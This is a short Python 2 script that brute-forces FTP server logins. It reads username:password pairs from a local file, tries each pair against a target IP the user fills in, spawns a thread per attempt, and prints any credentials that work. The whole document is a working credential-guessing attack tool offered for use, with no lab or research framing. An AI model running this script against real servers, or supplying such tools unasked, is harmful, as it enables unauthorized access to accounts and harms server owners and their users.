#!/usr/bin/python

import sys
import ftplib
import os
import threading

target = "" # add the target ip here to proceed the bruteforce attack on the ftp server.
port = 21

def ftplogin(username,password):
    global target,port
    if threading.activeCount() < 10:
        try:
            server = ftplib.FTP()
            server.connect(target,port)
            print "[*]Checking %s:%s" % (username,password)
            server.login(username,password)
            print "[*]Credentials Found \n\t\t username = %s \n\t\t password = %s" % (username,password)
            server.quit()
        except:
            return "Unable to handle the thread"

def main():
    global target
    global port 
    print "Simple python script to brute-force the ftp server\n" 
    print "Written By KRN-BHARGAV"
    print "SOURCE :: i get logic or algorithm help from www.shellvoide.com\n"
    print "but made this script code by own.\n"
    
    if len(target) == 0:
        print "Please must supply target to the script.\n"
    
    
    
    filepath = os.getcwd()+"/file.txt" # change the file name , if you want to use the dictonary or add the username and password to file.txt
    #get the file content
    
    with open(filepath,"r") as req_file:
        lines = req_file.readlines()# read the all lines from the file 
        for line in lines:
            if len(line.split(":")) == 2:
                username = line.split(":")[0]
                password = line.split(":")[1].strip("\n")                    
                
                multithread=threading.Thread(target=ftplogin,args=(username,password,))
                multithread.start()
            else:
                print "username and password are not in format(username:password)"
                
main()    
    
